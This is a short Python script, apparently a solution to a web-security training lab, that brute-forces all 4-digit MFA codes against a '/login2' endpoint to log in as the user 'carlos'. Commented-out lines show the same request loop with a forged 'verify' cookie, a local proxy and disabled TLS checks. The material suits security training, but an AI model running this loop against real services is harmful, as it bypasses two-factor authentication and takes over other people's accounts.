# import requests
# import sys
# import urllib3
from post_test import post_login2, sys, requests

# urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# proxies = {'http': 'http://127.0.0.1:8087', 'https': 'http://127.0.0.1:8087'}

def brute_force_attack(url):
    # cookies = {"verify": "carlos"}
    # mfa_code = ""

    for i in range(10000):
        mfcode = str(i).zfill(4)
        # data = {"mfa-code": mfcode} 
        back = post_login2(url, mfcode)
        
        if back == 1 :
            break    
        # res = requests.post(url + "/login2", data=data, cookies=cookies, proxies=proxies, verify=False)

        # if "Incorrect security code" not in res.text or res.status_code == 302:
        #     mfa_code = mfcode
        #     sys.stdout.write("\r" + mfcode)
        #     sys.stdout.flush()
        #     r = requests.get(url + "/my-account?id=carlos", cookies=cookies, proxies=proxies, verify=False)

        #     if "Log out" in r.text:
        #         print("(+) You have solved the lab with success!")
        #         break
        # else:
        #     sys.stdout.write("\r" + mfcode)
        #     sys.stdout.flush()

    return back

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    mfcode = brute_force_attack(url)

    if mfcode :
        print("(+) The lab has been solved with success")
    else:
        print("(-) Fail to resolve the lab")
